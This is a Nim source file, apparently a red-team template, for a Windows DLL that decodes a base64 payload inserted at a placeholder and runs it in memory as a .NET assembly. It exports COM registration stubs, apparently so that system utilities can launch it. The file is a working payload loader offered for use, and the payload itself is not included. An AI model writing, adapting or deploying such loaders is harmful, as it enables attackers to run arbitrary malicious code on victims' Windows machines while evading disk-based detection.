import os
import std/base64
import winim/clr
import strformat
import winim/lean

#import strenc

func toByteSeq*(str: string): seq[byte] {.inline.} =
    ## Converts a string to the corresponding byte sequence.
    @(str.toOpenArrayByte(0, str.high))


proc NimMain() {.cdecl, importc.}

proc DllMain(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : BOOL {.stdcall, exportc, dynlib.} =
  NimMain()
  
  MessageBox(0, "Start", "Nim is Powerful", 0)
  var b64 :string  = ""
[[PAYLOAD]]

  var ct : string = decode(b64)
  var bytes = toByteSeq(ct)

  when not defined(release):
    echo bytes.len()

  when not defined(release):  
    echo "[*] Installed .NET versions"
    for v in clrVersions():
      echo fmt"    \--- {v}"
    echo "\n"

    echo ""
  
  MessageBox(0, "Before loading", "Nim is Powerful", 0)
  
  #try:
  var assembly = load(bytes)
  discard MessageBox(0, "Assembly start", "Nim is Powerful", 0)
  var arr = toCLRVariant([""], VT_BSTR) # Passing no arguments
  assembly.EntryPoint.Invoke(nil, toCLRVariant([arr]))

  #except CatchableError as e:
  #  MessageBox(0, "error", "Nim is Powerful", 0)

  discard MessageBox(0, "Assembly lodaed", "Nim is Powerful", 0)

  return true


proc DllRegisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    return true

proc DllUnregisterServer(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    return true

proc DllInstall(hinstDLL: HINSTANCE, fdwReason: DWORD, lpvReserved: LPVOID) : bool {.stdcall, exportc, dynlib.} =
    return true


